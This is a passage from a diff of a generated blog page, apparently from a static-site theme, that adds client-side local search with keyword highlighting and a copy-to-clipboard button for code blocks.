+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
 
 
 
@@ -1442,6 +1306,83 @@
   
 
   
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap');
+      $(e).after($wrap);
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text();
+        }).toArray().join('\n');
+        var ta = document.createElement('textarea');
+        var range = document.createRange(); //For Chrome
+        var sel = window.getSelection(); //For Chrome
+        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+        ta.style.top = yPosition + 'px'; //Prevent page scroll
+        ta.style.position = 'absolute';
+        ta.style.opacity = '0';
+        ta.value = code;
+        ta.textContent = code; //For FireFox
+        ta.contentEditable = true;
+        ta.readOnly = false;
+        document.body.appendChild(ta);
+        range.selectNode(ta);
+        sel.removeAllRanges();
+        sel.addRange(range);
+        ta.setSelectionRange(0, code.length);
+        var result = document.execCommand('copy');
+        
+          if (result) $(this).text('复制成功');
+          else $(this).text('复制失败');
+        
+        ta.blur(); //For iOS
+        $(this).blur();
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn');
+        setTimeout(function () {
+          $b.text('复制');
+        }, 300);
+      }).append(e);
+    })
+  </script>
+
 
   
 
